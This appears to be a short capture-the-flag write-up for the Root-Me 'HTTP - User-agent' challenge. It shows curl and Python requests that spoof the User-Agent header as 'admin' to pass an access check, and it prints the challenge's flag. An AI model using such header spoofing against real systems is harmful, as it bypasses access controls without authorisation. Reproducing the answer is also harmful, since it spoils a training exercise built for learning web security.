---
title: HTTP - User-agent
author: thanguyen165
date: 2023-01-02 07:00:00 +0700
categories: [Practice, rootme]
tags: [Web Exploitation, rootme]
---

* Points: 10
* Link: [https://www.root-me.org/en/Challenges/Web-Server/HTTP-User-agent](https://www.root-me.org/en/Challenges/Web-Server/HTTP-User-agent)

## Solution

Let's visit the site's source:
```sh
curl http://challenge01.root-me.org/web-serveur/ch2/
```
```html
<html>
  <body>
    <link rel="stylesheet" property="stylesheet" id="s" type="text/css" href="/template/s.css" media="all" /><iframe id="iframe" src="https://www.root-me.org/?page=externe_header"></iframe>
    <h3>Wrong user-agent: you are not the "admin" browser!</h3>
  </body>
</html>
```

Okey, only admin can get access
```sh
curl -H "user-agent: admin" http://challenge01.root-me.org/web-serveur/ch2/
```
```html
<html>
  <body>
    <link rel="stylesheet" property="stylesheet" id="s" type="text/css" href="/template/s.css" media="all" /><iframe id="iframe" src="https://www.root-me.org/?page=externe_header"></iframe>
    <h3>
      Welcome master!<br />
      Password: rr$Li9%L34qd1AAe27
    </h3>
  </body>
</html>
```

Perfect, the flag is
```
rr$Li9%L34qd1AAe27
```

We can use Python, too
```python
import requests
resp = requests.get('http://challenge01.root-me.org/web-serveur/ch2/', headers={'User-Agent': 'Admin'})
print(resp.text)
```
